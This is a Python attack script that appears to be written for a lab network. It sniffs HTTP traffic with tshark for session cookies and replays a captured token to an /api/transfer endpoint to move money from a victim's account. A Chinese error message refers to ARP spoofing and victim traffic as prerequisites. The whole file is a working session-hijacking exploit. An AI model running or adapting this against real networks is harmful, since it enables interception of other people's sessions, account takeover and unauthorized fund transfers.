#!/usr/bin/env python3
import re
import subprocess
import sys
import urllib.request


INTERFACE = subprocess.check_output(
    ["sh", "-c", "ip -o -4 addr show | awk '/10\\.30\\.50\\.99/ {print $2; exit}'"],
    text=True,
).strip()


def capture_cookie():
    print(f"capturing HTTP cookies on {INTERFACE} for 35 seconds", flush=True)
    result = subprocess.run(
        [
            "tshark", "-i", INTERFACE, "-a", "duration:35",
            "-Y", "http.cookie", "-T", "fields", "-e", "http.cookie",
        ],
        text=True,
        capture_output=True,
    )
    for line in result.stdout.splitlines():
        match = re.search(r"(?:^|;\s*)session=([0-9a-f]{32})", line)
        if match:
            return match.group(1)
    return None


def main():
    token = capture_cookie()
    if not token:
        print("未捕获到会话 Cookie；确认 ARP 欺骗和受害者 HTTP 流量已启动。", file=sys.stderr)
        return 1
    request = urllib.request.Request(
        "http://10.30.50.10/api/transfer?account=acct-2&amount=250",
        headers={"Cookie": f"session={token}", "User-Agent": "session-replay"},
    )
    with urllib.request.urlopen(request, timeout=5) as response:
        print(response.read().decode())
    print(f"replayed session={token}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
